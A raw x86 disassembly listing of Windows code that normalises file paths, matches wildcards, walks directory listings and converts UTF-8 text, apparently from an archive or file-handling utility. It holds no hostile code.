  40a03d:	jne    0x40a04d
  40a03f:	cmp    WORD PTR [ebp-0x806],0x5c
  40a047:	jne    0x40a04d
  40a049:	mov    cl,0x1
  40a04b:	jmp    0x40a04f
  40a04d:	xor    cl,cl
  40a04f:	cmp    BYTE PTR [ebp-0xc1a],0x0
  40a056:	je     0x40a09b
  40a058:	test   cl,cl
  40a05a:	je     0x40a081
  40a05c:	lea    eax,[ebp-0x808]
  40a062:	push   eax
  40a063:	mov    edx,ebx
  40a065:	mov    ecx,edi
  40a067:	call   0x409dd0
  40a06c:	mov    eax,DWORD PTR [ebp-0xc20]
  40a072:	add    esp,0x4
  40a075:	push   eax
  40a076:	push   ebx
  40a077:	push   edi
  40a078:	call   DWORD PTR ds:0x4244b4
  40a07e:	add    esp,0xc
  40a081:	mov    ecx,edi
  40a083:	call   0x40a2b0
  40a088:	mov    eax,edi
  40a08a:	pop    edi
  40a08b:	pop    esi
  40a08c:	pop    ebx
  40a08d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a090:	xor    ecx,ebp
  40a092:	call   0x40d492
  40a097:	mov    esp,ebp
  40a099:	pop    ebp
  40a09a:	ret    
  40a09b:	cmp    WORD PTR [edi+0x2],0x3a
  40a0a0:	mov    al,BYTE PTR [ebp-0xc19]
  40a0a6:	je     0x40a0d3
  40a0a8:	test   al,al
  40a0aa:	jne    0x40a0d7
  40a0ac:	push   DWORD PTR [ebp-0xc28]
  40a0b2:	push   ebx
  40a0b3:	push   edi
  40a0b4:	call   esi
  40a0b6:	mov    esi,DWORD PTR ds:0x4244b4
  40a0bc:	add    esp,0xc
  40a0bf:	push   0x401bac
  40a0c4:	push   ebx
  40a0c5:	push   edi
  40a0c6:	call   esi
  40a0c8:	mov    eax,DWORD PTR [ebp-0xc20]
  40a0ce:	jmp    0x40a17b
  40a0d3:	test   al,al
  40a0d5:	je     0x40a138
  40a0d7:	test   cl,cl
  40a0d9:	je     0x40a130
  40a0db:	push   edi
  40a0dc:	mov    edx,0x104
  40a0e1:	lea    ecx,[ebp-0xa10]
  40a0e7:	call   0x409dd0
  40a0ec:	add    esp,0x4
  40a0ef:	lea    eax,[ebp-0x808]
  40a0f5:	push   eax
  40a0f6:	mov    edx,0x104
  40a0fb:	lea    ecx,[ebp-0xc18]
  40a101:	call   0x409dd0
  40a106:	add    esp,0x4
  40a109:	lea    eax,[ebp-0xc18]
  40a10f:	push   eax
  40a110:	lea    eax,[ebp-0xa10]
  40a116:	push   eax
  40a117:	call   DWORD PTR ds:0x4244bc
  40a11d:	add    esp,0x8
  40a120:	test   eax,eax
  40a122:	jne    0x40a282
  40a128:	mov    eax,DWORD PTR [ebp-0xc20]
  40a12e:	jmp    0x40a17e
  40a130:	test   al,al
  40a132:	jne    0x40a282
  40a138:	mov    ecx,DWORD PTR [ebp-0xc28]
  40a13e:	mov    ax,WORD PTR [edi]
  40a141:	cmp    ax,WORD PTR [ecx]
  40a144:	jne    0x40a282
  40a14a:	cmp    WORD PTR [edi+0x4],0x5c
  40a14f:	je     0x40a282
  40a155:	lea    eax,[ebp-0x808]
  40a15b:	push   eax
  40a15c:	push   ebx
  40a15d:	push   edi
  40a15e:	call   esi
  40a160:	mov    esi,DWORD PTR ds:0x4244b4
  40a166:	add    esp,0xc
  40a169:	push   0x401bac
  40a16e:	push   ebx
  40a16f:	push   edi
  40a170:	call   esi
  40a172:	mov    eax,DWORD PTR [ebp-0xc20]
  40a178:	add    eax,0x4
  40a17b:	add    esp,0xc
  40a17e:	push   eax
  40a17f:	push   ebx
  40a180:	push   edi
  40a181:	call   esi
  40a183:	add    esp,0xc
  40a186:	mov    ecx,edi
  40a188:	call   0x40a2b0
  40a18d:	push   0x5c
  40a18f:	push   edi
  40a190:	call   DWORD PTR ds:0x4243f4
  40a196:	mov    esi,eax
  40a198:	add    esp,0x8
  40a19b:	test   esi,esi
  40a19d:	je     0x40a282
  40a1a3:	movzx  ecx,WORD PTR [esi+0x2]
  40a1a7:	lea    eax,[esi+0x2]
  40a1aa:	mov    DWORD PTR [ebp-0xc20],eax
  40a1b0:	test   ecx,ecx
  40a1b2:	je     0x40a27d
  40a1b8:	cmp    ecx,0x2e
  40a1bb:	je     0x40a1cd
  40a1bd:	cmp    ecx,0x5c
  40a1c0:	jne    0x40a23a
  40a1c6:	cmp    esi,edi
  40a1c8:	je     0x40a23a
  40a1ca:	push   eax
  40a1cb:	jmp    0x40a23f
  40a1cd:	movzx  ecx,WORD PTR [esi+0x4]
  40a1d1:	lea    edx,[esi+0x4]
  40a1d4:	cmp    ecx,0x5c
  40a1d7:	je     0x40a23e
  40a1d9:	test   cx,cx
  40a1dc:	je     0x40a23e
  40a1de:	cmp    ecx,0x2e
  40a1e1:	jne    0x40a23a
  40a1e3:	movzx  ecx,WORD PTR [esi+0x6]
  40a1e7:	cmp    ecx,0x5c
  40a1ea:	je     0x40a1f1
  40a1ec:	test   cx,cx
  40a1ef:	jne    0x40a23a
  40a1f1:	xor    eax,eax
  40a1f3:	push   0x5c
  40a1f5:	push   edi
  40a1f6:	mov    WORD PTR [esi],ax
  40a1f9:	call   DWORD PTR ds:0x4243f8
  40a1ff:	mov    edx,eax
  40a201:	add    esp,0x8
  40a204:	mov    eax,0x5c
  40a209:	mov    DWORD PTR [ebp-0xc24],edx
  40a20f:	mov    WORD PTR [esi],ax
  40a212:	test   edx,edx
  40a214:	je     0x40a234
  40a216:	mov    ecx,edx
  40a218:	lea    eax,[esi+0x6]
  40a21b:	push   eax
  40a21c:	sub    ecx,edi
  40a21e:	sar    ecx,1
  40a220:	mov    eax,ebx
  40a222:	sub    eax,ecx
  40a224:	push   eax
  40a225:	push   edx
  40a226:	call   DWORD PTR ds:0x4244b8
  40a22c:	mov    esi,DWORD PTR [ebp-0xc24]
  40a232:	jmp    0x40a251
  40a234:	mov    eax,DWORD PTR [ebp-0xc20]
  40a23a:	mov    esi,eax
  40a23c:	jmp    0x40a254
  40a23e:	push   edx
  40a23f:	mov    ecx,esi
  40a241:	sub    ecx,edi
  40a243:	sar    ecx,1
  40a245:	mov    eax,ebx
  40a247:	sub    eax,ecx
  40a249:	push   eax
  40a24a:	push   esi
  40a24b:	call   DWORD PTR ds:0x4244b8
  40a251:	add    esp,0xc
  40a254:	push   0x5c
  40a256:	push   esi
  40a257:	call   DWORD PTR ds:0x4243f4
  40a25d:	mov    esi,eax
  40a25f:	add    esp,0x8
  40a262:	test   esi,esi
  40a264:	jne    0x40a1a3
  40a26a:	mov    eax,edi
  40a26c:	pop    edi
  40a26d:	pop    esi
  40a26e:	pop    ebx
  40a26f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a272:	xor    ecx,ebp
  40a274:	call   0x40d492
  40a279:	mov    esp,ebp
  40a27b:	pop    ebp
  40a27c:	ret    
  40a27d:	xor    eax,eax
  40a27f:	mov    WORD PTR [esi],ax
  40a282:	mov    ecx,DWORD PTR [ebp-0x4]
  40a285:	mov    eax,edi
  40a287:	pop    edi
  40a288:	pop    esi
  40a289:	xor    ecx,ebp
  40a28b:	pop    ebx
  40a28c:	call   0x40d492
  40a291:	mov    esp,ebp
  40a293:	pop    ebp
  40a294:	ret    
  40a295:	push   0x0
  40a297:	mov    edx,0x4010c0
  40a29c:	mov    ecx,0x5e5
  40a2a1:	call   0x407010
  40a2a6:	int3   
  40a2a7:	int3   
  40a2a8:	int3   
  40a2a9:	int3   
  40a2aa:	int3   
  40a2ab:	int3   
  40a2ac:	int3   
  40a2ad:	int3   
  40a2ae:	int3   
  40a2af:	int3   
  40a2b0:	push   esi
  40a2b1:	mov    esi,DWORD PTR ds:0x4243f4
  40a2b7:	push   0x2f
  40a2b9:	push   ecx
  40a2ba:	call   esi
  40a2bc:	add    esp,0x8
  40a2bf:	test   eax,eax
  40a2c1:	je     0x40a2e3
  40a2c3:	push   edi
  40a2c4:	mov    edi,0x5c
  40a2c9:	lea    esp,[esp+0x0]
  40a2d0:	mov    WORD PTR [eax],di
  40a2d3:	add    eax,0x2
  40a2d6:	push   0x2f
  40a2d8:	push   eax
  40a2d9:	call   esi
  40a2db:	add    esp,0x8
  40a2de:	test   eax,eax
  40a2e0:	jne    0x40a2d0
  40a2e2:	pop    edi
  40a2e3:	pop    esi
  40a2e4:	ret    
  40a2e5:	int3   
  40a2e6:	int3   
  40a2e7:	int3   
  40a2e8:	int3   
  40a2e9:	int3   
  40a2ea:	int3   
  40a2eb:	int3   
  40a2ec:	int3   
  40a2ed:	int3   
  40a2ee:	int3   
  40a2ef:	int3   
  40a2f0:	push   ebp
  40a2f1:	mov    ebp,esp
  40a2f3:	push   ecx
  40a2f4:	push   edi
  40a2f5:	push   0xffffffff
  40a2f7:	mov    edi,ecx
  40a2f9:	push   edi
  40a2fa:	push   0x104
  40a2ff:	push   0x416f48
  40a304:	mov    DWORD PTR [ebp-0x4],edx
  40a307:	call   DWORD PTR ds:0x42439c
  40a30d:	add    esp,0x10
  40a310:	test   eax,eax
  40a312:	je     0x40a31b
  40a314:	xor    eax,eax
  40a316:	pop    edi
  40a317:	mov    esp,ebp
  40a319:	pop    ebp
  40a31a:	ret    
  40a31b:	push   esi
  40a31c:	push   0x5c
  40a31e:	push   0x416f48
  40a323:	call   DWORD PTR ds:0x4243f8
  40a329:	mov    esi,eax
  40a32b:	add    esp,0x8
  40a32e:	test   esi,esi
  40a330:	je     0x40a337
  40a332:	add    esi,0x2
  40a335:	jmp    0x40a355
  40a337:	cmp    WORD PTR ds:0x416f48,0x0
  40a33f:	je     0x40a350
  40a341:	cmp    WORD PTR ds:0x416f4a,0x3a
  40a349:	mov    esi,0x416f4c
  40a34e:	je     0x40a355
  40a350:	mov    esi,0x416f48
  40a355:	push   0x40e698
  40a35a:	push   edi
  40a35b:	mov    DWORD PTR ds:0x40e698,0x0
  40a365:	call   DWORD PTR ds:0x424408
  40a36b:	add    esp,0x8
  40a36e:	mov    ds:0x40e694,eax
  40a373:	cmp    eax,0xffffffff
  40a376:	je     0x40a487
  40a37c:	push   0x40e6bc
  40a381:	push   0x104
  40a386:	push   0x417150
  40a38b:	call   DWORD PTR ds:0x4244b8
  40a391:	mov    ecx,0x40e6bc
  40a396:	add    esp,0xc
  40a399:	lea    edx,[ecx+0x2]
  40a39c:	lea    esp,[esp+0x0]
  40a3a0:	mov    ax,WORD PTR [ecx]
  40a3a3:	add    ecx,0x2
  40a3a6:	test   ax,ax
  40a3a9:	jne    0x40a3a0
  40a3ab:	push   ebx
  40a3ac:	mov    ebx,DWORD PTR ds:0x4243f4
  40a3b2:	sub    ecx,edx
  40a3b4:	sar    ecx,1
  40a3b6:	push   0x3f
  40a3b8:	push   esi
  40a3b9:	mov    DWORD PTR ds:0x417358,ecx
  40a3bf:	call   ebx
  40a3c1:	add    esp,0x8
  40a3c4:	test   eax,eax
  40a3c6:	jne    0x40a3f6
  40a3c8:	push   0x2a
  40a3ca:	push   esi
  40a3cb:	call   ebx
  40a3cd:	add    esp,0x8
  40a3d0:	test   eax,eax
  40a3d2:	jne    0x40a3f6
  40a3d4:	push   edi
  40a3d5:	call   DWORD PTR [ebp-0x4]
  40a3d8:	add    esp,0x4
  40a3db:	push   DWORD PTR ds:0x40e694
  40a3e1:	call   DWORD PTR ds:0x424410
  40a3e7:	add    esp,0x4
  40a3ea:	mov    eax,0x1
  40a3ef:	pop    ebx
  40a3f0:	pop    esi
  40a3f1:	pop    edi
  40a3f2:	mov    esp,ebp
  40a3f4:	pop    ebp
  40a3f5:	ret    
  40a3f6:	mov    ecx,DWORD PTR ds:0x417358
  40a3fc:	mov    ebx,DWORD PTR ds:0x4244b8
  40a402:	mov    edi,esi
  40a404:	sub    edi,0x416f48
  40a40a:	sar    edi,1
  40a40c:	lea    esp,[esp+0x0]
  40a410:	lea    eax,[edi+ecx*1]
  40a413:	cmp    eax,0x103
  40a418:	jae    0x40a435
  40a41a:	mov    eax,0x104
  40a41f:	push   0x417150
  40a424:	sub    eax,edi
  40a426:	push   eax
  40a427:	push   esi
  40a428:	call   ebx
  40a42a:	push   0x416f48
  40a42f:	call   DWORD PTR [ebp-0x4]
  40a432:	add    esp,0x10
  40a435:	push   0x40e698
  40a43a:	push   DWORD PTR ds:0x40e694
  40a440:	call   DWORD PTR ds:0x42440c
  40a446:	add    esp,0x8
  40a449:	test   eax,eax
  40a44b:	jne    0x40a3db
  40a44d:	push   0x40e6bc
  40a452:	push   0x104
  40a457:	push   0x417150
  40a45c:	call   ebx
  40a45e:	mov    ecx,0x40e6bc
  40a463:	add    esp,0xc
  40a466:	lea    edx,[ecx+0x2]
  40a469:	lea    esp,[esp+0x0]
  40a470:	mov    ax,WORD PTR [ecx]
  40a473:	add    ecx,0x2
  40a476:	test   ax,ax
  40a479:	jne    0x40a470
  40a47b:	sub    ecx,edx
  40a47d:	sar    ecx,1
  40a47f:	mov    DWORD PTR ds:0x417358,ecx
  40a485:	jmp    0x40a410
  40a487:	pop    esi
  40a488:	xor    eax,eax
  40a48a:	pop    edi
  40a48b:	mov    esp,ebp
  40a48d:	pop    ebp
  40a48e:	ret    
  40a48f:	int3   
  40a490:	push   ebp
  40a491:	mov    ebp,esp
  40a493:	push   ecx
  40a494:	push   ebx
  40a495:	push   esi
  40a496:	push   edi
  40a497:	mov    esi,edx
  40a499:	mov    edi,ecx
  40a49b:	mov    ebx,DWORD PTR ds:0x424414
  40a4a1:	movzx  ecx,WORD PTR [edi]
  40a4a4:	mov    eax,ecx
  40a4a6:	cmp    eax,0x5c
  40a4a9:	ja     0x40a528
  40a4ab:	movzx  eax,BYTE PTR [eax+0x40a5ac]
  40a4b2:	jmp    DWORD PTR [eax*4+0x40a594]
  40a4b9:	movzx  eax,WORD PTR [esi]
  40a4bc:	cmp    eax,0x2f
  40a4bf:	je     0x40a4ca
  40a4c1:	cmp    eax,0x5c
  40a4c4:	jne    0x40a58b
  40a4ca:	add    esi,0x2
  40a4cd:	add    edi,0x2
  40a4d0:	jmp    0x40a4a1
  40a4d2:	movzx  eax,WORD PTR [esi]
  40a4d5:	add    edi,0x2
  40a4d8:	cmp    eax,0x5c
  40a4db:	ja     0x40a58b
  40a4e1:	movzx  eax,BYTE PTR [eax+0x40a618]
  40a4e8:	jmp    DWORD PTR [eax*4+0x40a60c]
  40a4ef:	add    esi,0x2
  40a4f2:	jmp    0x40a4a1
  40a4f4:	push   0x401bb8
  40a4f9:	push   esi
  40a4fa:	call   ebx
  40a4fc:	push   0x401bb8
  40a501:	push   edi
  40a502:	lea    esi,[esi+eax*2]
  40a505:	call   ebx
  40a507:	add    esp,0x10
  40a50a:	lea    edi,[edi+eax*2]
  40a50d:	jmp    0x40a4a1
  40a50f:	movzx  eax,WORD PTR [esi]
  40a512:	add    edi,0x2
  40a515:	cmp    eax,0x5c
  40a518:	ja     0x40a4ef
  40a51a:	movzx  eax,BYTE PTR [eax+0x40a680]
  40a521:	jmp    DWORD PTR [eax*4+0x40a678]
  40a528:	movzx  eax,WORD PTR [esi]
  40a52b:	push   eax
  40a52c:	mov    DWORD PTR [ebp-0x4],eax
  40a52f:	mov    ebx,ecx
  40a531:	call   DWORD PTR ds:0x424400
  40a537:	add    esp,0x4
  40a53a:	test   eax,eax
  40a53c:	je     0x40a550
  40a53e:	push   DWORD PTR [ebp-0x4]
  40a541:	call   DWORD PTR ds:0x424418
  40a547:	movzx  eax,ax
  40a54a:	add    esp,0x4
  40a54d:	mov    DWORD PTR [ebp-0x4],eax
  40a550:	push   ebx
  40a551:	call   DWORD PTR ds:0x424400
  40a557:	add    esp,0x4
  40a55a:	test   eax,eax
  40a55c:	je     0x40a56b
  40a55e:	push   ebx
  40a55f:	call   DWORD PTR ds:0x424418
  40a565:	add    esp,0x4
  40a568:	movzx  ebx,ax
  40a56b:	cmp    WORD PTR [ebp-0x4],bx
  40a56f:	jne    0x40a58b
  40a571:	add    edi,0x2
  40a574:	add    esi,0x2
  40a577:	jmp    0x40a49b
  40a57c:	xor    eax,eax
  40a57e:	cmp    WORD PTR [esi],ax
  40a581:	pop    edi
  40a582:	pop    esi
  40a583:	sete   al
  40a586:	pop    ebx
  40a587:	mov    esp,ebp
  40a589:	pop    ebp
  40a58a:	ret    
  40a58b:	pop    edi
  40a58c:	pop    esi
  40a58d:	xor    al,al
  40a58f:	pop    ebx
  40a590:	mov    esp,ebp
  40a592:	pop    ebp
  40a593:	ret    
  40a594:	jl     0x40a53b
  40a596:	inc    eax
  40a597:	add    ah,dh
  40a599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a59a:	inc    eax
  40a59b:	add    dl,dl
  40a59d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a59e:	inc    eax
  40a59f:	add    BYTE PTR [ecx+0xf0040a4],bh
  40a5a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a6:	inc    eax
  40a5a7:	add    BYTE PTR [eax],ch
  40a5a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5aa:	inc    eax
  40a5ab:	add    BYTE PTR [eax],al
  40a5ad:	add    eax,0x5050505
  40a5b2:	add    eax,0x5050505
  40a5b7:	add    eax,0x5050505
  40a5bc:	add    eax,0x5050505
  40a5c1:	add    eax,0x5050505
  40a5c6:	add    eax,0x5050505
  40a5cb:	add    eax,0x5050505
  40a5d0:	add    eax,0x5050505
  40a5d5:	add    eax,0x5050501
  40a5da:	add    al,BYTE PTR [ebx]
  40a5dc:	add    eax,0x5050505
  40a5e1:	add    eax,0x5050505
  40a5e6:	add    eax,0x5050505
  40a5eb:	add    al,0x5
  40a5ed:	add    eax,0x5050505
  40a5f2:	add    eax,0x5050505
  40a5f7:	add    eax,0x5050505
  40a5fc:	add    eax,0x5050505
  40a601:	add    eax,0x5050505
  40a606:	add    eax,0x498d0305
  40a60b:	add    BYTE PTR [ecx-0x10ffbf5c],ah
  40a611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a612:	inc    eax
  40a613:	add    BYTE PTR [ebx+0x40a5],cl
  40a619:	add    al,BYTE PTR [edx]
  40a61b:	add    al,BYTE PTR [edx]
  40a61d:	add    al,BYTE PTR [edx]
  40a61f:	add    al,BYTE PTR [edx]
  40a621:	add    al,BYTE PTR [edx]
  40a623:	add    al,BYTE PTR [edx]
  40a625:	add    al,BYTE PTR [edx]
  40a627:	add    al,BYTE PTR [edx]
  40a629:	add    al,BYTE PTR [edx]
  40a62b:	add    al,BYTE PTR [edx]
  40a62d:	add    al,BYTE PTR [edx]
  40a62f:	add    al,BYTE PTR [edx]
  40a631:	add    al,BYTE PTR [edx]
  40a633:	add    al,BYTE PTR [edx]
  40a635:	add    al,BYTE PTR [edx]
  40a637:	add    al,BYTE PTR [edx]
  40a639:	add    al,BYTE PTR [edx]
  40a63b:	add    al,BYTE PTR [edx]
  40a63d:	add    al,BYTE PTR [edx]
  40a63f:	add    al,BYTE PTR [edx]
  40a641:	add    al,BYTE PTR [edx]
  40a643:	add    al,BYTE PTR [edx]
  40a645:	add    al,BYTE PTR [ecx]
  40a647:	add    BYTE PTR [edx],al
  40a649:	add    al,BYTE PTR [edx]
  40a64b:	add    al,BYTE PTR [edx]
  40a64d:	add    al,BYTE PTR [edx]
  40a64f:	add    al,BYTE PTR [edx]
  40a651:	add    al,BYTE PTR [edx]
  40a653:	add    al,BYTE PTR [edx]
  40a655:	add    al,BYTE PTR [edx]
  40a657:	add    al,BYTE PTR [edx]
  40a659:	add    al,BYTE PTR [edx]
  40a65b:	add    al,BYTE PTR [edx]
  40a65d:	add    al,BYTE PTR [edx]
  40a65f:	add    al,BYTE PTR [edx]
  40a661:	add    al,BYTE PTR [edx]
  40a663:	add    al,BYTE PTR [edx]
  40a665:	add    al,BYTE PTR [edx]
  40a667:	add    al,BYTE PTR [edx]
  40a669:	add    al,BYTE PTR [edx]
  40a66b:	add    al,BYTE PTR [edx]
  40a66d:	add    al,BYTE PTR [edx]
  40a66f:	add    al,BYTE PTR [edx]
  40a671:	add    al,BYTE PTR [edx]
  40a673:	add    al,BYTE PTR [eax]
  40a675:	lea    ecx,[ecx+0x0]
  40a678:	mov    eax,ds:0xef0040a4
  40a67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67e:	inc    eax
  40a67f:	add    BYTE PTR [eax],al
  40a681:	add    DWORD PTR [ecx],eax
  40a683:	add    DWORD PTR [ecx],eax
  40a685:	add    DWORD PTR [ecx],eax
  40a687:	add    DWORD PTR [ecx],eax
  40a689:	add    DWORD PTR [ecx],eax
  40a68b:	add    DWORD PTR [ecx],eax
  40a68d:	add    DWORD PTR [ecx],eax
  40a68f:	add    DWORD PTR [ecx],eax
  40a691:	add    DWORD PTR [ecx],eax
  40a693:	add    DWORD PTR [ecx],eax
  40a695:	add    DWORD PTR [ecx],eax
  40a697:	add    DWORD PTR [ecx],eax
  40a699:	add    DWORD PTR [ecx],eax
  40a69b:	add    DWORD PTR [ecx],eax
  40a69d:	add    DWORD PTR [ecx],eax
  40a69f:	add    DWORD PTR [ecx],eax
  40a6a1:	add    DWORD PTR [ecx],eax
  40a6a3:	add    DWORD PTR [ecx],eax
  40a6a5:	add    DWORD PTR [ecx],eax
  40a6a7:	add    DWORD PTR [ecx],eax
  40a6a9:	add    DWORD PTR [ecx],eax
  40a6ab:	add    DWORD PTR [ecx],eax
  40a6ad:	add    DWORD PTR [eax],eax
  40a6af:	add    BYTE PTR [ecx],al
  40a6b1:	add    DWORD PTR [ecx],eax
  40a6b3:	add    DWORD PTR [ecx],eax
  40a6b5:	add    DWORD PTR [ecx],eax
  40a6b7:	add    DWORD PTR [ecx],eax
  40a6b9:	add    DWORD PTR [ecx],eax
  40a6bb:	add    DWORD PTR [ecx],eax
  40a6bd:	add    DWORD PTR [ecx],eax
  40a6bf:	add    DWORD PTR [ecx],eax
  40a6c1:	add    DWORD PTR [ecx],eax
  40a6c3:	add    DWORD PTR [ecx],eax
  40a6c5:	add    DWORD PTR [ecx],eax
  40a6c7:	add    DWORD PTR [ecx],eax
  40a6c9:	add    DWORD PTR [ecx],eax
  40a6cb:	add    DWORD PTR [ecx],eax
  40a6cd:	add    DWORD PTR [ecx],eax
  40a6cf:	add    DWORD PTR [ecx],eax
  40a6d1:	add    DWORD PTR [ecx],eax
  40a6d3:	add    DWORD PTR [ecx],eax
  40a6d5:	add    DWORD PTR [ecx],eax
  40a6d7:	add    DWORD PTR [ecx],eax
  40a6d9:	add    DWORD PTR [ecx],eax
  40a6db:	add    DWORD PTR [eax],eax
  40a6dd:	int3   
  40a6de:	int3   
  40a6df:	int3   
  40a6e0:	push   ebp
  40a6e1:	mov    ebp,esp
  40a6e3:	sub    esp,0x10
  40a6e6:	push   ebx
  40a6e7:	push   esi
  40a6e8:	push   edi
  40a6e9:	mov    edi,ecx
  40a6eb:	mov    ecx,DWORD PTR [edi]
  40a6ed:	mov    edx,ecx
  40a6ef:	mov    DWORD PTR [ebp-0xc],ecx
  40a6f2:	lea    esi,[edx+0x1]
  40a6f5:	mov    al,BYTE PTR [edx]
  40a6f7:	inc    edx
  40a6f8:	test   al,al
  40a6fa:	jne    0x40a6f5
  40a6fc:	sub    edx,esi
  40a6fe:	cmp    BYTE PTR ds:0x414b16,0x0
  40a705:	lea    esi,[edx+0x1]
  40a708:	lea    eax,[ecx+esi*1]
  40a70b:	mov    DWORD PTR [edi],eax
  40a70d:	je     0x40a71a
  40a70f:	xor    ebx,ebx
  40a711:	mov    DWORD PTR [ebp-0x8],0x1
  40a718:	jmp    0x40a726
  40a71a:	mov    ebx,0xfde9
  40a71f:	mov    DWORD PTR [ebp-0x8],0x0
  40a726:	mov    eax,ds:0x40e064
  40a72b:	mov    ds:0x40e068,eax
  40a730:	lea    eax,[ebp-0x4]
  40a733:	push   eax
  40a734:	lea    eax,[esi+esi*1]
  40a737:	push   eax
  40a738:	mov    DWORD PTR [ebp-0x4],0x0
  40a73f:	call   0x40b030
  40a744:	test   eax,eax
  40a746:	je     0x40a76c
  40a748:	mov    edi,DWORD PTR [ebp-0x4]
  40a74b:	push   esi
  40a74c:	push   edi
  40a74d:	push   esi
  40a74e:	push   DWORD PTR [ebp-0xc]
  40a751:	push   DWORD PTR [ebp-0x8]
  40a754:	push   ebx
  40a755:	call   DWORD PTR ds:0x424354
  40a75b:	test   eax,eax
  40a75d:	je     0x40a77d
  40a75f:	mov    DWORD PTR ds:0x40e8d4,edi
  40a765:	pop    edi
  40a766:	pop    esi
  40a767:	pop    ebx
  40a768:	mov    esp,ebp
  40a76a:	pop    ebp
  40a76b:	ret    
  40a76c:	push   0x0
  40a76e:	mov    edx,0x4010c0
  40a773:	mov    ecx,0x5e5
  40a778:	call   0x407010
  40a77d:	push   0x0
  40a77f:	xor    edx,edx
  40a781:	mov    ecx,0x5dc
  40a786:	call   0x407010
  40a78b:	int3   
  40a78c:	int3   
  40a78d:	int3   
  40a78e:	int3   
  40a78f:	int3   
  40a790:	push   ecx
  40a791:	push   esi
  40a792:	mov    esi,DWORD PTR [ecx]
  40a794:	mov    edx,esi
  40a796:	push   edi
  40a797:	lea    edi,[edx+0x1]
  40a79a:	lea    ebx,[ebx+0x0]
  40a7a0:	mov    al,BYTE PTR [edx]
  40a7a2:	inc    edx
  40a7a3:	test   al,al
  40a7a5:	jne    0x40a7a0
  40a7a7:	sub    edx,edi
  40a7a9:	inc    edx
  40a7aa:	cmp    BYTE PTR ds:0x414b16,0x0
  40a7b1:	lea    eax,[esi+edx*1]
  40a7b4:	mov    DWORD PTR [ecx],eax
  40a7b6:	je     0x40a7bf
  40a7b8:	xor    eax,eax
  40a7ba:	lea    ecx,[eax+0x1]
  40a7bd:	jmp    0x40a7c6
  40a7bf:	mov    eax,0xfde9
  40a7c4:	xor    ecx,ecx
  40a7c6:	push   edx
  40a7c7:	push   0x40e8e0
  40a7cc:	push   edx
  40a7cd:	push   esi
  40a7ce:	push   ecx
  40a7cf:	push   eax
  40a7d0:	call   DWORD PTR ds:0x424354
  40a7d6:	test   eax,eax
  40a7d8:	je     0x40a7de
  40a7da:	pop    edi
  40a7db:	pop    esi
  40a7dc:	pop    ecx
  40a7dd:	ret    
  40a7de:	push   0x0
  40a7e0:	xor    edx,edx
  40a7e2:	mov    ecx,0x5dc
  40a7e7:	call   0x407010
  40a7ec:	int3   
  40a7ed:	int3   
  40a7ee:	int3   
  40a7ef:	int3   
  40a7f0:	push   ebp
  40a7f1:	mov    ebp,esp
  40a7f3:	sub    esp,0x8
  40a7f6:	push   ebx
  40a7f7:	push   esi
  40a7f8:	mov    esi,DWORD PTR ds:0x41f360
  40a7fe:	cmp    esi,0x1000
  40a804:	jae    0x40a882
  40a806:	cmp    BYTE PTR ds:0x40eaf3,0x0
  40a80d:	jne    0x40a868
  40a80f:	push   esi
  40a810:	push   DWORD PTR ds:0x41735c
  40a816:	push   0x417360
  40a81b:	call   0x40db6c
  40a820:	add    esp,0xc
  40a823:	mov    eax,0x7fff
  40a828:	sub    eax,esi
  40a82a:	push   eax
  40a82b:	lea    eax,[esi+0x417360]
  40a831:	push   eax
  40a832:	push   DWORD PTR ds:0x40eae8
  40a838:	call   DWORD PTR ds:0x4243d4
  40a83e:	mov    esi,DWORD PTR ds:0x41f360
  40a844:	add    esi,eax
  40a846:	add    esp,0xc
  40a849:	mov    DWORD PTR ds:0x41f360,esi
  40a84f:	mov    DWORD PTR ds:0x41735c,0x417360
  40a859:	cmp    esi,0x7fff
  40a85f:	je     0x40a868
  40a861:	mov    BYTE PTR ds:0x40eaf3,0x1
  40a868:	test   esi,esi
  40a86a:	jne    0x40a882
  40a86c:	mov    BYTE PTR ds:0x40eaf2,0x0
  40a873:	mov    BYTE PTR ds:0x40eaf3,0x0
  40a87a:	or     al,0xff
  40a87c:	pop    esi
  40a87d:	pop    ebx
  40a87e:	mov    esp,ebp
  40a880:	pop    ebp
  40a881:	ret    
  40a882:	mov    eax,ds:0x41735c
  40a887:	mov    cl,BYTE PTR [eax]
  40a889:	movzx  ebx,cl
  40a88c:	and    ebx,0xffffffbf
  40a88f:	lea    edx,[eax+0x1]
  40a892:	lea    eax,[ebx-0x20]
  40a895:	mov    BYTE PTR ds:0x40e8cd,cl
  40a89b:	mov    DWORD PTR [ebp-0x4],edx
  40a89e:	cmp    eax,0xf
  40a8a1:	ja     0x40a8b7
  40a8a3:	lea    eax,[ebx-0x1f]
  40a8a6:	add    WORD PTR ds:0x40e8d8,ax
  40a8ad:	mov    ebx,0x2
  40a8b2:	jmp    0x40ac24
  40a8b7:	cmp    ebx,0x1a
  40a8ba:	ja     0x40ac24
  40a8c0:	movzx  eax,BYTE PTR [ebx+0x40ac9c]
  40a8c7:	jmp    DWORD PTR [eax*4+0x40ac70]
  40a8ce:	cmp    BYTE PTR ds:0x40eaf2,0x0
  40a8d5:	jne    0x40ac49
  40a8db:	mov    al,BYTE PTR [edx+0x2]
  40a8de:	mov    ah,BYTE PTR [edx]
  40a8e0:	mov    cl,BYTE PTR [edx+0x1]
  40a8e3:	mov    ds:0x40e8d2,al
  40a8e8:	mov    al,BYTE PTR [edx+0x3]
  40a8eb:	add    edx,0x4
  40a8ee:	mov    BYTE PTR ds:0x40eaf2,0x1
  40a8f5:	mov    BYTE PTR ds:0x40e8cf,ah
  40a8fb:	mov    BYTE PTR ds:0x40e8ce,cl
  40a901:	mov    ds:0x40e8d3,al
  40a906:	mov    DWORD PTR [ebp-0x4],edx
  40a909:	mov    BYTE PTR ds:0x414b12,0x0
  40a910:	mov    BYTE PTR ds:0x414b13,0x0
  40a917:	mov    BYTE PTR ds:0x414b16,0x0
  40a91e:	cmp    ah,0x1
  40a921:	jne    0x40a939
  40a923:	cmp    cl,ah
  40a925:	jne    0x40ac24
  40a92b:	mov    BYTE PTR ds:0x414b16,ah
